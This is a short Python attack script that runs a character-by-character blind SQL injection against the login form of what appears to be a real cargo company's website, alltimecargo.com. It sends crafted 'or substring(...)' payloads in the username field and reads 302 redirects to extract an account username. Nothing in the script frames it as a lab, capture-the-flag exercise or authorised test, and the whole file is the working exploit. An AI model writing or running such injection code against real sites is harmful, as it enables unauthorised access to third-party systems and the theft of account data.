#!/usr/bin/python3

import time
import requests
import signal
from pwn import *
import sys
import string
print("")
#=====================================================================================================================#

def def_handler(sig, frame):
    print("Aquitter Le Processus")
    sys.exit()

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables
Url = "http://www.alltimecargo.com/checklogin.php"
Alphabets = string.ascii_lowercase + string.ascii_uppercase + string.digits

def SqlInjection():
    p1=log.progress("Force_Brute")
    p1.status("Attack BlindSql ")
    time.sleep(2)
    username = ""
    p1 = log.progress("Username")
    headers = {
        'Host': 'www.alltimecargo.com',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '83',
        'Origin': 'http://www.alltimecargo.com',
        'Connection': 'close',
        'Referer': 'http://www.alltimecargo.com/login.php',
        'Upgrade-Insecure-Requests': '1',
    }
    for v in range(1, 22):
        for character in Alphabets:
            Post_Data = {
                "myusername": "admin 'or substring(username,%d,1) = '%s' -- - " % (v, character),
                'mypassword': 'pasdsword',
                'Submit': '',
            }
            r = requests.post(Url, data=Post_Data, headers=headers, allow_redirects=False).status_code
            p1.status(Post_Data['myusername'])
            if r == 302:
                username += character
                p1.status(username)
                break;
                

SqlInjection()

